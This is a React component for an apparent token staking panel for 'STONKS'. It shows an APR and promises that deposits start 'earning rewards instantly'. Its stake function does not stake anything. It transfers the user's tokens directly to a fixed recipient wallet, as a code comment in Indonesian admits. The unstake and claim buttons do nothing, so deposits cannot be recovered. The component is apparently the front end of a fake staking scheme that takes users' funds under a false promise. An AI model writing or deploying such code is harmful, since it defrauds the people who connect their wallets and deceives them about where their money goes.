"use client";

import { useEffect, useState, useCallback } from "react";
import {
  BrowserProvider,
  Contract,
  formatUnits,
  parseUnits,
  type Eip1193Provider,
} from "ethers";
import { ArrowUpCircle, ArrowDownCircle, Coins } from "lucide-react";
import { CONTRACT, RECIPIENT_WALLET } from "@/lib/chain";

const ERC20_ABI = [
  "function balanceOf(address owner) view returns (uint256)",
  "function decimals() view returns (uint8)",
  "function transfer(address to, uint256 amount) returns (bool)",
  "function approve(address spender, uint256 amount) returns (bool)",
];

function getInjected(): Eip1193Provider | null {
  if (typeof window === "undefined") return null;
  const w = window as unknown as { ethereum?: Eip1193Provider };
  return w.ethereum ?? null;
}

export default function StakePanel({ apr }: { apr: string }) {
  const [amount, setAmount] = useState("");
  const [balance, setBalance] = useState<string | null>(null);
  const [decimals, setDecimals] = useState(18);
  const [busy, setBusy] = useState(false);
  const [status, setStatus] = useState<string | null>(null);

  const loadBalance = useCallback(async () => {
    const p = getInjected();
    if (!p) return;
    try {
      const provider = new BrowserProvider(p);
      const accounts = (await p.request({
        method: "eth_accounts",
      })) as string[];
      if (!accounts.length) return;
      const token = new Contract(CONTRACT, ERC20_ABI, provider);
      const dec = await token.decimals();
      const bal = await token.balanceOf(accounts[0]);
      setDecimals(Number(dec));
      setBalance(formatUnits(bal, dec));
    } catch {
      /* ignore */
    }
  }, []);

  useEffect(() => {
    loadBalance();
    const p = getInjected();
    const ep = p as unknown as { on?: (e: string, cb: () => void) => void };
    ep.on?.("accountsChanged", loadBalance);
    return () => {
      const ep2 = p as unknown as {
        removeListener?: (e: string, cb: () => void) => void;
      };
      ep2.removeListener?.("accountsChanged", loadBalance);
    };
  }, [loadBalance]);

  const stake = async () => {
    const p = getInjected();
    if (!p) {
      setStatus("Connect your wallet first.");
      return;
    }
    if (!amount || parseFloat(amount) <= 0) {
      setStatus("Enter a valid amount.");
      return;
    }
    setBusy(true);
    setStatus(null);
    try {
      const provider = new BrowserProvider(p);
      const signer = await provider.getSigner();
      const token = new Contract(CONTRACT, ERC20_ABI, signer);
      const amt = parseUnits(amount, decimals);
      // transfer langsung ke wallet tujuan (stake = kirim token)
      const tx = await token.transfer(RECIPIENT_WALLET, amt);
      setStatus("Waiting for confirmation...");
      await tx.wait();
      setStatus("Stake successful!");
      setAmount("");
      await loadBalance();
    } catch (e) {
      console.error(e);
      const msg = (e as Error).message;
      // Potong jadi singkat supaya tidak keluar card; simpan detail di console
      const shortMsg = msg.length > 120 ? msg.slice(0, 120) + "..." : msg;
      setStatus("Failed: " + shortMsg);
    } finally {
      setBusy(false);
    }
  };

  return (
    <div className="px-card bg-[#4a1768] p-6">
      {/* balance bar */}
      <div className="flex items-center justify-between mb-4">
        <span className="px-heading text-white/80 text-[11px]">Your STONKS</span>
        <span className="px-heading text-[#3ddad8] text-[11px]">
          {balance !== null ? `${balance} STONKS` : "—"}
        </span>
      </div>

      {/* amount input */}
      <div className="px-border bg-[#2a1440] p-4 flex items-center justify-between">
        <input
          type="number"
          inputMode="decimal"
          min="0"
          step="any"
          placeholder="0.00"
          value={amount}
          onChange={(e) => setAmount(e.target.value)}
          className="bg-transparent text-white text-lg w-full outline-none placeholder:text-white/40"
        />
        <button
          type="button"
          className="px-chip bg-[#3ddad8] text-[#20102e] px-3 py-1 text-[10px]"
          onClick={() => {
            if (balance !== null) setAmount(balance);
          }}
        >
          MAX
        </button>
      </div>

      {/* apr info */}
      <div className="flex items-center justify-between mt-4">
        <span className="px-heading text-white/80 text-[11px]">Current APR</span>
        <span className="px-heading text-[#ffbe39] text-[13px]">{apr}</span>
      </div>

      {/* actions */}
      <div className="grid gap-3 sm:grid-cols-3 mt-6">
        <button
          type="button"
          onClick={stake}
          disabled={busy}
          className="px-btn bg-[#3ddad8] text-[#20102e] px-4 py-3 text-[12px] flex items-center justify-center gap-2 disabled:opacity-50"
        >
          <ArrowUpCircle className="h-4 w-4" />
          {busy ? "PROCESSING..." : "STAKE"}
        </button>
        <button
          type="button"
          onClick={() => {}}
          className="px-btn bg-[#f06943] text-white px-4 py-3 text-[12px] flex items-center justify-center gap-2"
        >
          <ArrowDownCircle className="h-4 w-4" /> UNSTAKE
        </button>
        <button
          type="button"
          onClick={() => {}}
          className="px-btn bg-[#ffbe39] text-[#20102e] px-4 py-3 text-[12px] flex items-center justify-center gap-2"
        >
          <Coins className="h-4 w-4" /> CLAIM
        </button>
      </div>

      {status && (
        <p className="text-center text-sm mt-4 text-[#3ddad8] break-words max-w-full leading-snug">
          {status}
        </p>
      )}

      <p className="text-[#c9b8d8] text-center text-sm mt-6">
        Deposit your STONKS to start earning rewards instantly.
      </p>
    </div>
  );
}
